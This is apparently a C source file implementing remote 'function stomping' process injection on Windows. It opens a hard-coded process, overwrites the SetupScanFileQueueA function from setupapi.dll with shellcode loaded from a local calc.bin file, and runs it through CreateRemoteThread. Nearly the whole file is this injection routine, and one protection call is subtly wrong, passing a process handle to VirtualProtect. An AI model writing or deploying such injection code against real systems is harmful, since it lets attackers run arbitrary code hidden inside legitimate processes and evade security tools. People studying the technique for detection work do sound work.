#define _CRT_SECURE_NO_WARNINGS
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>



int Stomp(DWORD pid, PBYTE sc, size_t sc_size) {
	DWORD old = 0;
	HANDLE hProcess = NULL;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
	if (hProcess == NULL) {
		printf("Cant open handle to process: %d\n", GetLastError());
		return 1;
	}

	//Function that will be stomped: SetupScanFileQueueA
	PVOID fnPoint = GetProcAddress(LoadLibraryA("setupapi.dll"), "SetupScanFileQueueA");
	if (fnPoint == NULL) {
		printf("Failed to get function address: %d\n", GetLastError());
		goto _Cleanup;
	}

	printf("[+] Address Of SetupScanFileQueueA : 0x%p \n", fnPoint);


	if (!VirtualProtectEx(hProcess, fnPoint, sc_size, PAGE_READWRITE, &old)) {
		printf("Failed to set mem protection: %d\n", GetLastError());
		goto _Cleanup;
	}

	DWORD written = 0;
	if (!WriteProcessMemory(hProcess, fnPoint, sc, sc_size, &written) || written != sc_size) {
		printf("Cant write shellcode: %d\n", GetLastError());
		goto _Cleanup;
	}

	if (!VirtualProtect(hProcess, fnPoint, sc_size, PAGE_EXECUTE_READ, &old)) {
		printf("Failed to reverse mem protection: %d\n", GetLastError());
		goto _Cleanup;
	}

	DWORD tid = 0;
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, fnPoint, NULL, NULL, &tid);
	if (hThread == NULL) {
		printf("Cant create remote thread: %d\n", GetLastError());
		goto _Cleanup;
	}

	printf("Thread ID: %d", tid);
	printf("Press ENTER to continue\n");
	getchar();

	WaitForSingleObject(hThread, INFINITE);
	return 0;

_Cleanup:
	CloseHandle(hProcess);
	return 1;
}



//Temp function to read the shellcode from a file
int ReadF(const char* file_path, long* file_size, char** read_buffer) {
	FILE* file;

	file = fopen(file_path, "rb");
	if (file == NULL) {
		printf("Error opening file: %s", file_path);
		*file_size = 0;
		return 1;
	}

	fseek(file, 0, SEEK_END);
	*file_size = ftell(file);
	rewind(file);

	*read_buffer = (char*)malloc(*file_size * sizeof(char));
	if (*read_buffer == NULL) {
		printf("Memory allocation failed");
		fclose(file);
		return 1;
	}

	fread(*read_buffer, 1, *file_size, file);
	fclose(file);
	return 0;
}


int main()
{
	DWORD pid = 9412;
	long sc_size;
	char* sc;
	ReadF("C:\\Users\\nullb1t3\\Desktop\\calc.bin", &sc_size, &sc);

	Stomp(pid, sc, sc_size);

    return 0;
}

